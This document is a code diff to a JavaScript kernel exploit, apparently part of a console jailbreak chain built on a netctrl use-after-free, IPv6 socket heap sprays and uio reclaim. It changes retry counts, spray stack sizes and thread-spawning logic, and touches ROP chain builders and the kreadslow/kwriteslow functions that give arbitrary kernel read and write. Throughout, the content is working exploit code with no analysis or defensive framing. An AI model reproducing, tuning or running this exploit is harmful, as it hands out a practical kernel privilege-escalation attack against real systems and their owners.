@@ -167,11 +167,14 @@ MSG_IOV_NUM = 0x17;
 IPV6_SOCK_NUM = 96;
 IOV_THREAD_NUM = 8;
 UIO_THREAD_NUM = 8;
-MAIN_LOOP_ITERATIONS = 3;
-TRIPLEFREE_ITERATIONS = 8;
-KQUEUE_ITERATIONS = 5000;
 
-MAX_ROUNDS_TWIN = 20;
+MAIN_LOOP_ITERATIONS = 10;
+TRIPLEFREE_ITERATIONS = 30;
+KQUEUE_ITERATIONS = 5000;
+TRIPLET_ITERATIONS_IN_K = 5000;
+
+
+MAX_ROUNDS_TWIN = 10;
 MAX_ROUNDS_TRIPLET = 200;
 
 COMMAND_UIO_READ = 0;
@@ -251,7 +254,7 @@ var spray_ipv6_stack = malloc(0x2000);
 var spray_ipv6_triplet_ready = malloc(8);
 var spray_ipv6_triplet_done = malloc(8);
 var spray_ipv6_triplet_signal_buf = malloc(8);
-var spray_ipv6_triplet_stack = malloc(0x7000);
+var spray_ipv6_triplet_stack = malloc(0x22000);
 var store_socket_skip_0 = malloc(8);
 var store_socket_skip_1 = malloc(8);
 
@@ -504,11 +507,11 @@ function create_workers() {
     pipe_0 = read32(sock_buf);
     pipe_1 = read32(sock_buf.add(4));
 
-    ipv6_sock_spray_triplet_rop(ready, pipe_0, done, signal_buf);
+    ret = ipv6_sock_spray_triplet_rop(ready, pipe_0, done, signal_buf);
 
     // This stack is already filled in
-    //worker.rop = ret.rop;
-    //worker.loop_size = ret.loop_size;
+    worker.rop = ret.rop;
+    worker.loop_size = ret.loop_size;
     worker.pipe_0 = pipe_0;
     worker.pipe_1 = pipe_1;
     worker.ready = ready;
@@ -556,6 +559,13 @@ function init_workers() {
         var thread_id = ret & 0xFFFFFFFF;               // Convert to 32bits value
         uio_writev_workers[i].thread_id = thread_id;    // Save thread ID
     }
+    worker = spray_ipv6_triplet_worker;
+    ret = spawn_thread(worker.rop, worker.loop_size, spray_ipv6_triplet_stack);
+    if (ret.eq(BigInt_Error)) {
+        throw new Error("Could not spawn spray_ipv6_triplet_worker");
+    }
+    var thread_id = ret & 0xFFFFFFFF;                   // Convert to 32bits value
+    spray_ipv6_triplet_worker.thread_id = thread_id;    // Save thread ID
 }
 
 function nanosleep_fun(nsec) {
@@ -572,10 +582,11 @@ function wait_for(addr, threshold) {
 }
 
 function trigger_triplet_spray() {
-    debug("Trigger Triplet Stray");
+    //debug("Trigger Triplet Stray");
     worker = spray_ipv6_triplet_worker;
 
-    // Spawn a new spray
+    /*
+    // Spawn a new sprays
     var ret = spawn_thread(worker.rop, worker.loop_size, spray_ipv6_triplet_stack, true);
     
     if (ret.eq(BigInt_Error)) {
@@ -583,7 +594,7 @@ function trigger_triplet_spray() {
     }
     var thread_id = ret & 0xFFFFFFFF;                   // Convert to 32bits value
     spray_ipv6_triplet_worker.thread_id = thread_id;    // Save thread ID
-
+*/
     write64(worker.done, 0);
     ret = write(worker.pipe_1, worker.signal_buf, 1); 
     if (ret.eq(BigInt_Error)) {
@@ -635,6 +646,7 @@ function trigger_ipv6_spray_and_read() {
 
     // Spawn ipv6_sockets spray and read worker
     // Passing an stack addr reserved for each iteration
+    //debug("Im calling spawn_thread for spray_ipv6_worker");
     ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack); 
     if (ret.eq(BigInt_Error)) {
         throw new Error("Could not spray_ipv6_worker");
@@ -1597,8 +1609,8 @@ function kreadslow(addr, size) {
 
     var count = 0;
     // Reclaim with uio.
-    while (count < 10000) {
-        count++;
+    while (count < 20000) {
+        
         trigger_uio_writev(); // COMMAND_UIO_READ in fl0w's
         sched_yield();
 
@@ -1609,7 +1621,7 @@ function kreadslow(addr, size) {
             //debug("Break on reclaim with uio");
             break;
         }
-
+        count++;
         // Wake up all threads.
         read(uio_sock_0, tmp, size);
 
@@ -1623,7 +1635,7 @@ function kreadslow(addr, size) {
         write(uio_sock_1, tmp, size);
     }
 
-    if (count === 10000) {
+    if (count === 20000) {
         debug("kreadslow - Failed");
         return BigInt_Error;
     }
@@ -1635,7 +1647,7 @@ function kreadslow(addr, size) {
     build_uio(msgIov, uio_iov, 0, true, addr, size);
 
     // Find new one to free
-    triplets[1] = find_triplet_rop(triplets[0], -1, 1000);
+    triplets[1] = find_triplet_rop(triplets[0], -1, TRIPLET_ITERATIONS_IN_K);
 
     if (triplets[1] === -1) {
         debug("kreadslow - Failed to adquire twin");
@@ -1684,7 +1696,7 @@ function kreadslow(addr, size) {
         //debug("I read from leak_buffers[" + i + "] : " + hex(val) );
         if (!val.eq(tag_val)) {
             // Find triplet.
-            triplets[1] = find_triplet_rop(triplets[0], -1, 1000);
+            triplets[1] = find_triplet_rop(triplets[0], -1, TRIPLET_ITERATIONS_IN_K);
             if (triplets[1] === -1) {
                 debug("kreadslow - Failed to adquire twin 2");
                 return BigInt_Error;
@@ -1769,7 +1781,7 @@ function kwriteslow(addr, buffer, size) {
     build_uio(msgIov, uio_iov, 0, false, addr, size);
 
     // Find new one to free
-    triplets[1] = find_triplet_rop(triplets[0], -1, 1000);
+    triplets[1] = find_triplet_rop(triplets[0], -1, TRIPLET_ITERATIONS_IN_K);
 
     if (triplets[1] === -1) {
         debug("kwriteslow - Failed to adquire twin");
@@ -1808,7 +1820,7 @@ function kwriteslow(addr, buffer, size) {
     }
 
     // Find triplet.
-    triplets[1] = find_triplet_rop(triplets[0], -1, 1000);
+    triplets[1] = find_triplet_rop(triplets[0], -1, TRIPLET_ITERATIONS_IN_K);
 
     // Workers should have finished earlier no need to wait
     wait_uio_writev();
@@ -1831,9 +1843,9 @@ function rop_regen_and_loop(last_rop_entry, number_entries) {
     var new_rop_entry = last_rop_entry.add(8);
     var copy_entry = last_rop_entry.sub(number_entries*8).add(8);   // We add 8 to have the first ROP instruction add
     var rop_loop = last_rop_entry.sub(number_entries*8).add(8);     // We add 8 to have the first ROP instruction add
-
+    var count = 0;
     for(var i = 0; i < number_entries; i++){       
-
+        count++;
         var entry_add = copy_entry;
         var entry_val = read64(copy_entry);
 
@@ -1846,7 +1858,8 @@ function rop_regen_and_loop(last_rop_entry, number_entries) {
         copy_entry = copy_entry.add(8);
         new_rop_entry = new_rop_entry.add(0x28);
     }
-
+    //debug("Added " + (count*5) + " elements with size " + hex(count*5*8) );
+    //debug("Total stack size: " + hex(new_rop_entry.sub(last_rop_entry)) );
     // Time to jump back
     write64(new_rop_entry.add(0x0),  gadgets.POP_RSP_RET);
     write64(new_rop_entry.add(0x8),  rop_loop);
@@ -1854,13 +1867,14 @@ function rop_regen_and_loop(last_rop_entry, number_entries) {
 
 function spawn_thread(rop_array, loop_entries, stack, flag_no_copy) {
     
-    var rop_addr = stack !== undefined ? stack : malloc(0x600);
+    var rop_addr = (typeof stack !== 'undefined') ? stack : malloc(0x600);
 
     //const rop_addr = malloc(size); // ROP Stack plus extra size
 
     // Fill ROP Stack if we need to
     // Triplet ROP has already the stack filled
-    if (flag_no_copy !== undefined) {
+    if (typeof flag_no_copy === 'undefined') {
+        //debug("Filling a stack of " + rop_array.length + " elements and size " + hex(rop_array.length*8));
         for (var i=0 ; i < rop_array.length ; i++) {
             write64(rop_addr.add(i*8), rop_array[i]);
             //debug("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
@@ -1873,6 +1887,9 @@ function spawn_thread(rop_array, loop_entries, stack, flag_no_copy) {
             rop_regen_and_loop(last_rop_entry, loop_entries);
             // now our rop size is rop_array.length + loop_entries * (0x28) {copy primitive} + 0x10 {stack pivot}
         }
+    }
+    else {
+        debug("Not writting ROP, using provided stack : " + hex(rop_addr) );
     }
 
     const jmpbuf = malloc(0x60);
@@ -2380,17 +2397,24 @@ function ipv6_sock_spray_triplet_rop (ready_signal, run_fd, done_signal, signal_
     var loop_size = loop_end - loop_init;
 
     // Exit
-    rop.push(gadgets.POP_RDI_RET)
-    rop.push(0)
-    rop.push(thr_exit_wrapper)
+    //rop.push(gadgets.POP_RDI_RET)
+    //rop.push(0)
+    //rop.push(thr_exit_wrapper)
 
+    /*
     // Fill the stack here, not every time the thread is created
     debug("Filling stack triplet of size: " + rop.length);
     for(var i=0 ; i < rop.length ; i++) {
         write64(spray_ipv6_triplet_stack.add(i*8), rop[i]);
+        debug("Written to " + hex(spray_ipv6_triplet_stack.add(i*8)) + " : " + hex(rop[i]));
     }
     debug("Filling done");
-    return
+    */
+
+    return {
+        rop: rop,
+        loop_size: loop_size
+    }
 }
 
 netctrl_exploit();
